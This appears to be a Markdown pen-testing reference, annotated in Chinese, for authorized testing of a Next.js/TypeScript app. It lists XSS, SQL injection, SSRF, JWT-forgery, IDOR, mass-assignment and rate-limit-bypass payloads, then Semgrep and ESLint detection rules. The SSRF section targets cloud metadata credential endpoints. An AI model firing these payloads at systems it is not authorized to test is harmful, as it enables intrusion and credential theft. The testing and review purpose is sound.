# Attack Patterns Reference — Next.js / TypeScript

> 安全测试 payload 和检测模式，用于授权安全测试和代码审查。
> 来源：claude-skills/engineering-team/security-pen-testing/references/attack_patterns.md

---

## XSS 测试 Payload

### Reflected XSS

**基础 payload：**
```
<script>alert(document.domain)</script>
"><script>alert(document.domain)</script>
'><script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
```

**Filter bypass：**
```
<ScRiPt>alert(document.domain)</ScRiPt>
<script>alert(String.fromCharCode(100,111,99,117,109,101,110,116,46,100,111,109,97,105,110))</script>
<svg/onload=alert(document.domain)>
javascript:alert(document.domain)//
```

### DOM-Based XSS

**Sources（攻击者控制的输入）：**
```
document.location / .hash / .search / .referrer
window.name
localStorage / sessionStorage
postMessage data
```

**Sinks（危险输出）：**
```
element.innerHTML / outerHTML
document.write() / writeln()
eval() / setTimeout(string) / setInterval(string) / new Function(string)
element.setAttribute("onclick", ...)
location.href = ...
```

**检测模式：** 搜索从 Source 流向 Sink 且未净化的代码路径。

---

## SQL Injection 检测模式

### 检测 Payload

**Error-based：**
```
'                          -- 单引号触发 SQL error
' OR '1'='1               -- Boolean true
' AND 1=1--               -- Boolean true with comment
' AND 1=2--               -- Boolean false（对比响应）
```

**Time-based blind（按数据库）：**
```sql
-- SQLite (SuperHRD 使用)
' AND (SELECT CASE WHEN (1=1) THEN RANDOMBLOB(500000000) ELSE 1 END)--

-- MySQL
' AND SLEEP(5)--

-- PostgreSQL
' AND pg_sleep(5)--
```

### 数据库特定语法

| 功能 | SQLite | MySQL | PostgreSQL |
|---|---|---|---|
| 字符串连接 | `'a' \|\| 'b'` | `CONCAT('a','b')` | `'a' \|\| 'b'` |
| 注释 | `--` | `-- ` 或 `#` | `--` |
| 版本 | `sqlite_version()` | `VERSION()` | `version()` |
| Sleep | `RANDOMBLOB(N)` | `SLEEP(5)` | `pg_sleep(5)` |

---

## SSRF 检测技术

### 基础 Payload

```
http://127.0.0.1
http://localhost
http://[::1]                            -- IPv6 localhost
```

### 云元数据端点

```
# AWS EC2 Metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP Metadata
http://metadata.google.internal/computeMetadata/v1/

# Azure Metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### IP 编码绕过

```
http://0x7f000001           -- Hex 编码 127.0.0.1
http://2130706433           -- Decimal 编码 127.0.0.1
http://0177.0.0.1           -- Octal 编码
http://127.1                -- 缩写
http://127.0.0.1.nip.io     -- DNS rebinding
```

### 防御检查

```typescript
// ❌ BAD: 用户控制 URL 无验证
const url = request.query.url;
const response = await fetch(url);

// ✅ GOOD: URL 白名单验证
const ALLOWED_HOSTS = ["api.example.com", "cdn.example.com"];
const parsed = new URL(url);
if (!ALLOWED_HOSTS.includes(parsed.hostname)) {
  throw new Error("URL not in allowlist");
}
```

---

## JWT 操纵模式

### 解码（无需密钥）

```bash
# 解码 header
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d
# 输出: {"alg":"HS256"}

# 解码 payload
echo "eyJ1c2VyIjoiYWRtaW4ifQ" | base64 -d
# 输出: {"user":"admin"}
```

### Algorithm Confusion 攻击

**None algorithm：**
```json
// 修改 header — 设 alg 为 none
{"alg": "none", "typ": "JWT"}
// Token 格式: header.payload.（空签名）
```

**RS256 to HS256 confusion：**
如果服务器使用 RS256（非对称），尝试：
1. 获取服务器 RSA 公钥
2. 修改 `alg` 为 `HS256`
3. 用 RSA 公钥作为 HMAC secret 签名
4. 如果服务器用同一个 key 验证两种算法 → 绕过

### Claim 操纵

```json
{
  "sub": "other-user-id",     // 切换到其他用户
  "role": "admin",             // 从 "user" 升级到 "admin"
  "is_admin": true,            // 切换 admin 标志
  "exp": 9999999999            // 延长过期时间
}
```

### 弱密钥暴力破解

常见 JWT 密钥（如果有有效 token 可测试）：
```
secret, password, 123456, your-256-bit-secret, jwt_secret, changeme
```

---

## API 授权测试（IDOR, BOLA）

### IDOR 测试方法

**Step 1：识别资源标识符**
```
GET /api/candidates/{id}
GET /api/candidates/{id}  (screeningResult 关联)
```

**Step 2：跨账户测试**
```
# 用 User A 的 token 请求 User B 的资源
GET /api/candidates/{B_id}    → 期望 403
```

**Step 3：ID 操纵**
```
# 自增 ID — 递增/递减
/api/candidates/cuid123 → /api/candidates/cuid124

# CUID — 不可预测，但检查是否在其他响应中泄露
```

### Mass Assignment 测试

```json
// 正常请求
POST /api/upload
{ "name": "Candidate", "email": "test@test.com" }

// Mass assignment 尝试 — 添加特权字段
POST /api/upload
{ "name": "Candidate", "email": "test@test.com", "status": "completed", "overallScore": 100, "role": "admin" }

// 然后检查是否额外字段被持久化
```

---

## Rate Limiting 绕过技术

```
# IP 轮换 — 测试是否仅按 IP 限制
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4

# 大小写变化
/api/auth/callback/credentials
/API/AUTH/CALLBACK/CREDENTIALS

# 路径变化
/api/auth/callback/credentials
/api/auth/callback/credentials/
/api/./auth/callback/credentials

# HTTP 方法变化
POST /api/auth/callback/credentials
PUT /api/auth/callback/credentials
```

---

## Semgrep 自定义规则

```yaml
rules:
  - id: hardcoded-secret
    pattern: |
      const $SECRET = "..."
    message: "Hardcoded secret detected"
    severity: ERROR
    languages: [typescript]

  - id: unsafe-raw-query
    pattern: |
      prisma.$queryRawUnsafe(...)
    message: "Raw SQL query without parameterization"
    severity: WARNING
    languages: [typescript]

  - id: eval-usage
    pattern: eval(...)
    message: "eval() usage — potential code injection"
    severity: ERROR
    languages: [typescript, javascript]
```

---

## ESLint Security 插件配置

```json
{
  "plugins": ["security", "no-unsanitized"],
  "extends": ["plugin:security/recommended"],
  "rules": {
    "security/detect-object-injection": "error",
    "security/detect-non-literal-regexp": "warn",
    "security/detect-unsafe-regex": "error",
    "security/detect-eval-with-expression": "error",
    "no-unsanitized/method": "error",
    "no-unsanitized/property": "error"
  }
}
```
